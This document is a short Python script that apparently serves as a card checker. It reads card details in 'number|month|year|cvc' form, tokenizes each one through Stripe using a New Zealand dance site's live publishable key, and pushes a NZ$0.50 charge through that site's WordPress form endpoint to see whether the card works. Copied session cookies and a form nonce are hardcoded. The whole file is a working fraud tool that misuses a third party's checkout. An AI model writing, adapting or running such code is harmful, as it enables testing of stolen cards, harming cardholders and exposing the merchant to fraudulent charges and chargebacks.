import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'pragma': 'no-cache',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F946d9f95b9%3B+stripe-js-v3%2F946d9f95b9%3B+card-element&referrer=https%3A%2F%2Fwww.hardcoredance.co.nz&time_on_page=40872&key=pk_live_51OWZLeElHMgTV6WwZ83MXcRw4QbarZY7UBFuy4UkG8n3WEjDqAaiZ8x6hxkH3KF9f8qxRZfFoxjetAqWWaJLBPwK00llwRbrka'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_ga': 'GA1.1.319732123.1736005065',
	    '_ga_2QNVT6M9NE': 'GS1.1.1736005065.1.0.1736005067.0.0.0',
	    '__stripe_mid': '66aee31a-2d1a-423f-bd5e-a943bd8fee19af8a0b',
	    '__stripe_sid': '679438b2-2267-435b-9b59-36c11933a3cf773ff2',
	}
	
	headers = {
	    'authority': 'www.hardcoredance.co.nz',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9',
	    'cache-control': 'no-cache',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.319732123.1736005065; _ga_2QNVT6M9NE=GS1.1.1736005065.1.0.1736005067.0.0.0; __stripe_mid=66aee31a-2d1a-423f-bd5e-a943bd8fee19af8a0b; __stripe_sid=679438b2-2267-435b-9b59-36c11933a3cf773ff2',
	    'origin': 'https://www.hardcoredance.co.nz',
	    'pragma': 'no-cache',
	    'referer': 'https://www.hardcoredance.co.nz/hdc-apparel/',
	    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1736005106035',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=154&_fluentform_12_fluentformnonce=f08db0d2c3&_wp_http_referer=%2Fhdc-apparel%2F&custom-payment-amount_1=0.50&names%5Bfirst_name%5D=&names%5Blast_name%5D=&address_1%5Baddress_line_1%5D=&address_1%5Baddress_line_2%5D=&address_1%5Bcity%5D=&address_1%5Bzip%5D=&phone=&email=&payment_method=stripe&mega_crew_hoodie%5B%5D=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '12',
	}
	
	r2 = requests.post(
	    'https://www.hardcoredance.co.nz/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
